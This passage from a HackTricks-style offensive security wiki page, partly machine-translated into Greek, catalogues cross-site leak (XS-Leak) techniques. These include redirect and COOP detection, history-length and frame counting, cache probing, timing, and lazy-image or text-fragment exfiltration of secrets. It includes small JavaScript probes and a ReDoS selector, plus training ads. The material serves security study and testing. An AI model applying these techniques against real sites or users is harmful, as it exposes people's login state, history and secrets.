* **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Summary:** GC και SA επιτρέπουν να ελέγξουμε τον τύπο της απάντησης (opaque-redirect) αφού ολοκληρωθεί η ανακατεύθυνση.
* **Code Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Submitting a request using the Fetch API with `redirect: "manual"` and other params, it's possible to read the `response.type` attribute and if it's equals to `opaqueredirect` then the response was a redirect.

### COOP

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Summary:** Οι σελίδες που προστατεύονται από την Πολιτική Ανοίγματος Διαφορετικών Προελεύσεων (COOP) αποτρέπουν την πρόσβαση από διασυνοριακές αλληλεπιδράσεις.
* **Code Example**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

An attacker is capable of deducing the presence of the Cross-Origin Opener Policy (COOP) header in a cross-origin HTTP response. COOP is utilized by web applications to hinder external sites from obtaining arbitrary window references. The visibility of this header can be discerned by attempting to access the **`contentWindow` reference**. In scenarios where COOP is applied conditionally, the **`opener` property** becomes a telltale indicator: it's **undefined** when COOP is active, and **defined** in its absence.

### URL Max Length - Server Side

* **Inclusion Methods**: Fetch API, HTML Elements
* **Detectable Difference**: Status Code / Content
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Summary:** Ανιχνεύστε διαφορές στις απαντήσεις επειδή το μήκος της απάντησης ανακατεύθυνσης μπορεί να είναι πολύ μεγάλο ώστε ο διακομιστής να απαντήσει με σφάλμα και να δημιουργηθεί μια ειδοποίηση.
* **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

If a server-side redirect uses **user input inside the redirection** and **extra data**. It's possible to detect this behaviour because usually **servers** has a **limit request length**. If the **user data** is that **length - 1**, because the **redirect** is using **that data** and **adding** something **extra**, it will trigger an **error detectable via Error Events**.

If you can somehow set cookies to a user, you can also perform this attack by **setting enough cookies** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) so with the **response increased size** of the **correct response** an **error** is triggered. In this case, remember that is you trigger this request from a same site, `<script>` will automatically send the cookies (so you can check for errors).\
An example of the **cookie bomb + XS-Search** can be found in the Intended solution of this writeup: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` or to be in the same context is usually needed for this type of attack.

### URL Max Length - Client Side

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code / Content
* **More info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Summary:** Ανιχνεύστε διαφορές στις απαντήσεις επειδή το μήκος της απάντησης ανακατεύθυνσης μπορεί να είναι πολύ μεγάλο για μια αίτηση ώστε να παρατηρηθεί μια διαφορά.
* **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

According to [Chromium documentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), Chrome's maximum URL length is 2MB.

> In general, the _web platform_ does not have limits on the length of URLs (although 2^31 is a common limit). _Chrome_ limits URLs to a maximum length of **2MB** for practical reasons and to avoid causing denial-of-service problems in inter-process communication.

Therefore if the **redirect URL responded is larger in one of the cases**, it's possible to make it redirect with a **URL larger than 2MB** to hit the **length limit**. When this happens, Chrome shows an **`about:blank#blocked`** page.

The **noticeable difference**, is that if the **redirect** was **completed**, `window.origin` throws an **error** because a cross origin cannot access that info. However, if the **limit** was \*\*\*\* hit and the loaded page was **`about:blank#blocked`** the window's **`origin`** remains that of the **parent**, which is an **accessible information.**

All the extra info needed to reach the **2MB** can be added via a **hash** in the initial URL so it will be **used in the redirect**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Max Redirects

* **Inclusion Methods**: Fetch API, Frames
* **Detectable Difference**: Status Code
* **More info**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
* **Summary:** Χρησιμοποιήστε το όριο ανακατεύθυνσης του προγράμματος περιήγησης για να προσδιορίσετε την εμφάνιση ανακατευθύνσεων URL.
* **Code Example**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

If the **max** number of **redirects** to follow of a browser is **20**, an attacker could try to load his page with **19 redirects** and finally **send the victim** to the tested page. If an **error** is triggered, then the page was trying to **redirect the victim**.

### History Length

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Redirects
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Summary:** Ο κώδικας JavaScript χειρίζεται την ιστορία του προγράμματος περιήγησης και μπορεί να προσπελαστεί μέσω της ιδιότητας μήκους.
* **Code Example**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

The **History API** allows JavaScript code to manipulate the browser history, which **saves the pages visited by a user**. An attacker can use the length property as an inclusion method: to detect JavaScript and HTML navigation.\
**Checking `history.length`**, making a user **navigate** to a page, **change** it **back** to the same-origin and **checking** the new value of **`history.length`**.

### History Length with same URL

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: If URL is the same as the guessed one
* **Summary:** Είναι δυνατόν να μαντέψετε αν η τοποθεσία ενός πλαισίου/αναδυόμενου παραθύρου είναι σε μια συγκεκριμένη διεύθυνση URL εκμεταλλευόμενοι το μήκος της ιστορίας.
* **Code Example**: Below

An attacker could use JavaScript code to **manipulate the frame/pop-up location to a guessed one** and **immediately** **change it to `about:blank`**. If the history length increased it means the URL was correct and it had time to **increase because the URL isn't reloaded if it's the same**. If it didn't increased it means it **tried to load the guessed URL** but because we **immediately after** loaded **`about:blank`**, the **history length did never increase** when loading the guessed url.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** Evaluate the quantity of iframe elements by inspecting the `window.length` property.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Counting the **number of frames in a web** opened via `iframe` or `window.open` might help to identify the **status of the user over that page**.\
Moreover, if the page has always the same number of frames, checking **continuously** the number of frames might help to identify a **pattern** that might leak info.

An example of this technique is that in chrome, a **PDF** can be **detected** with **frame counting** because an `embed` is used internally. There are [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) that allow some control over the content such as `zoom`, `view`, `page`, `toolbar` where this technique could be interesting.

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** Read the leaked value to distinguish between 2 possible states
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Information leakage through HTML elements is a concern in web security, particularly when dynamic media files are generated based on user information, or when watermarks are added, altering the media size. This can be exploited by attackers to differentiate between possible states by analyzing the information exposed by certain HTML elements.

### Information Exposed by HTML Elements

* **HTMLMediaElement**: This element reveals the media's `duration` and `buffered` times, which can be accessed via its API. [Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: It exposes `videoHeight` and `videoWidth`. In some browsers, additional properties like `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, and `webkitDecodedFrameCount` are available, offering more in-depth information about the media content. [Read more about HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: This function provides details about video playback quality, including `totalVideoFrames`, which can indicate the amount of video data processed. [Read more about getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: This element leaks the `height` and `width` of an image. However, if an image is invalid, these properties will return 0, and the `image.decode()` function will be rejected, indicating the failure to load the image properly. [Read more about HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** Identify variations in website styling that correlate with the user's state or status.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web applications may change w**ebsite styling depending on the status of the use**. Cross-origin CSS files can be embedded on the attacker page with the **HTML link element**, and the **rules** will be **applied** to the attacker page. If a page dynamically changes these rules, an attacker can **detect** these **differences** depending on the user state.\
As a leak technique, the attacker can use the `window.getComputedStyle` method to **read CSS** properties of a specific HTML element. As a result, an attacker can read arbitrary CSS properties if the affected element and property name is known.

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** Detect if the `:visited` style is applied to an URL indicating it was already visited
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
According to [**this**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), this is not working in headless Chrome.
{% endhint %}

The CSS `:visited` selector is utilized to style URLs differently if they have been previously visited by the user. In the past, the `getComputedStyle()` method could be employed to identify these style differences. However, modern browsers have implemented security measures to prevent this method from revealing the state of a link. These measures include always returning the computed style as if the link were visited and restricting the styles that can be applied with the `:visited` selector.

Despite these restrictions, it's possible to discern the visited state of a link indirectly. One technique involves tricking the user into interacting with an area affected by CSS, specifically utilizing the `mix-blend-mode` property. This property allows the blending of elements with their background, potentially revealing the visited state based on user interaction.

Furthermore, detection can be achieved without user interaction by exploiting the rendering timings of links. Since browsers may render visited and unvisited links differently, this can introduce a measurable time difference in rendering. A proof of concept (PoC) was mentioned in a Chromium bug report, demonstrating this technique using multiple links to amplify the timing difference, thereby making the visited state detectable through timing analysis.

For further details on these properties and methods, visit their documentation pages:

* `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** In Google Chrome, a dedicated error page is displayed when a page is blocked from being embedded on a cross-origin site due to X-Frame-Options restrictions.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

In Chrome, if a page with the `X-Frame-Options` header set to "deny" or "same-origin" is embedded as an object, an error page appears. Chrome uniquely returns an empty document object (instead of `null`) for the `contentDocument` property of this object, unlike in iframes or other browsers. Attackers could exploit this by detecting the empty document, potentially revealing information about the user's state, especially if developers inconsistently set the X-Frame-Options header, often overlooking error pages. Awareness and consistent application of security headers are crucial for preventing such leaks.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

The `Content-Disposition` header, specifically `Content-Disposition: attachment`, instructs the browser to download content rather than display it inline. This behavior can be exploited to detect whether a user has access to a page that triggers a file download. In Chromium-based browsers, there are a few techniques to detect this download behavior:

1. **Download Bar Monitoring**:
* When a file is downloaded in Chromium-based browsers, a download bar appears at the bottom of the browser window.
* By monitoring changes in the window height, attackers can infer the appearance of the download bar, suggesting that a download has been initiated.
2. **Download Navigation with Iframes**:
* When a page triggers a file download using the `Content-Disposition: attachment` header, it does not cause a navigation event.
* By loading the content in an iframe and monitoring for navigation events, it's possible to check if the content disposition causes a file download (no navigation) or not.
3. **Download Navigation without Iframes**:
* Similar to the iframe technique, this method involves using `window.open` instead of an iframe.
* Monitoring navigation events in the newly opened window can reveal whether a file download was triggered (no navigation) or if the content is displayed inline (navigation occurs).

In scenarios where only logged-in users can trigger such downloads, these techniques can be used to indirectly infer the user's authentication state based on the browser's response to the download request.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
This is why this technique is interesting: Chrome now has **cache partitioning**, and the cache key of the newly opened page is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, but if I open an ngrok page and use fetch in it, the cache key will be: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, the **cache key is different**, so the cache cannot be shared. You can find more detail here: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Comment from [**here**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

If a site `example.com` includes a resource from `*.example.com/resource` then that resource will have the **same caching key** as if the resource was directly **requested through top-level navigation**. That is because the caching key is consisted of top-level _eTLD+1_ and frame _eTLD+1_.

Because accessing the cache is faster than loading a resource, it's possible to try to change the location of a page and cancel it 20ms (for example) after. If the origin was changed after the stop, it means that the resource was cached.\
Or could just **send some fetch to the pontentially cached page and measure the time it takes**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** It's possible to find out if a response to a fetch request is a redirect
* **Code Example**:

![](<../.gitbook/assets/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** It's possible to try to load a resource and about before it's loaded the loading is interrupted. Depending on if an error is triggered, the resource was or wasn't cached.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Use _**fetch**_ and _**setTimeout**_ with an **AbortController** to both detect whether the **resource is cached** and to evict a specific resource from the browser cache. Moreover, the process occurs without caching new content.

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** It's possible to **overwrite built-in functions** and read their arguments which even from **cross-origin script** (which cannot be read directly), this might **leak valuable information**.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** Measure execution time of a web using service workers.
* **Code Example**:

In the given scenario, the attacker takes the initiative to register a **service worker** within one of their domains, specifically "attacker.com". Next, the attacker opens a new window in the target website from the main document and instructs the **service worker** to commence a timer. As the new window begins to load, the attacker navigates the reference obtained in the previous step to a page managed by the **service worker**.

Upon arrival of the request initiated in the preceding step, the **service worker** responds with a **204 (No Content)** status code, effectively terminating the navigation process. At this point, the **service worker** captures a measurement from the timer initiated earlier in step two. This measurement is influenced by the duration of JavaScript causing delays in the navigation process.

{% hint style="warning" %}
In an execution timing it's possible to **eliminate** **network factors** to obtain **more precise measurements**. For example, by loading the resources used by the page before loading it.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** Use [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) to measure the time it takes to perform a request. Other clocks could be used.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** se [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) to measure the time it takes to perform a request using `window.open`. Other clocks could be used.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## With HTML or Re Injection

Here you can find techniques to exfiltrate information from a cross-origin HTML **injecting HTML content**. These techniques are interesting in cases where for any reason you can **inject HTML but you cannot inject JS code**.

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

If you need to **exfiltrate content** and you can **add HTML previous to the secret** you should check the **common dangling markup techniques**.\
However, if for whatever reason you **MUST** do it **char by char** (maybe the communication is via a cache hit) you can use this trick.

**Images** in HTML has a "**loading**" attribute whose value can be "**lazy**". In that case, the image will be loaded when it's viewed and not while the page is loading:
```html
<img src=/something loading=lazy >
```
Λοιπόν, αυτό που μπορείτε να κάνετε είναι να **προσθέσετε πολλούς άχρηστους χαρακτήρες** (Για παράδειγμα **χιλιάδες "W"**) για να **γεμίσετε τη σελίδα πριν από το μυστικό ή να προσθέσετε κάτι όπως** `<br><canvas height="1850px"></canvas><br>.`\
Έτσι, αν για παράδειγμα η **ένεση μας εμφανιστεί πριν από τη σημαία**, η **εικόνα** θα **φορτωθεί**, αλλά αν εμφανιστεί **μετά** τη **σημαία**, η σημαία + οι άχρηστοι χαρακτήρες θα **εμποδίσουν τη φόρτωσή της** (θα χρειαστεί να πειραματιστείτε με το πόσους άχρηστους χαρακτήρες να τοποθετήσετε). Αυτό συνέβη σε [**αυτή τη γραφή**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Μια άλλη επιλογή θα ήταν να χρησιμοποιήσετε το **scroll-to-text-fragment** αν επιτρέπεται:

#### Scroll-to-text-fragment

Ωστόσο, κάνετε το **ρομπότ να έχει πρόσβαση στη σελίδα** με κάτι όπως
```
#:~:text=SECR
```
Έτσι, η ιστοσελίδα θα είναι κάτι σαν: **`https://victim.com/post.html#:~:text=SECR`**

Όπου το post.html περιέχει τους χαρακτήρες junk του επιτιθέμενου και την εικόνα lazy load και στη συνέχεια προστίθεται το μυστικό του bot.

Αυτό το κείμενο θα κάνει το bot να έχει πρόσβαση σε οποιοδήποτε κείμενο στη σελίδα που περιέχει το κείμενο `SECR`. Καθώς αυτό το κείμενο είναι το μυστικό και είναι ακριβώς **κάτω από την εικόνα**, η **εικόνα θα φορτωθεί μόνο αν το μαντέψιμο μυστικό είναι σωστό**. Έτσι, έχετε τον ορατό σας για να **εξάγετε το μυστικό χαρακτήρα προς χαρακτήρα**.

Μερικά παραδείγματα κώδικα για να εκμεταλλευτείτε αυτό: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Εικόνα Lazy Loading Χρόνος Βασισμένος

Αν **δεν είναι δυνατό να φορτωθεί μια εξωτερική εικόνα** που θα μπορούσε να υποδείξει στον επιτιθέμενο ότι η εικόνα φορτώθηκε, μια άλλη επιλογή θα ήταν να προσπαθήσετε να **μαντέψετε τον χαρακτήρα πολλές φορές και να το μετρήσετε**. Αν η εικόνα φορτωθεί, όλα τα αιτήματα θα διαρκέσουν περισσότερο από ότι αν η εικόνα δεν φορτωθεί. Αυτό χρησιμοποιήθηκε στην [**λύση αυτού του writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **που συνοψίζεται εδώ:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Αν χρησιμοποιηθεί το `jQuery(location.hash)`, είναι δυνατόν να ανακαλυφθεί μέσω του χρόνου **αν υπάρχει κάποιο HTML περιεχόμενο**, αυτό συμβαίνει επειδή αν ο επιλεγέας `main[id='site-main']` δεν ταιριάζει, δεν χρειάζεται να ελέγξει τους υπόλοιπους **επιλεγείς**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defenses

Υπάρχουν μετριασμοί που προτείνονται στο [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) καθώς και σε κάθε ενότητα του wiki [https://xsleaks.dev/](https://xsleaks.dev/). Ρίξτε μια ματιά εκεί για περισσότερες πληροφορίες σχετικά με το πώς να προστατευθείτε από αυτές τις τεχνικές.

## References

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
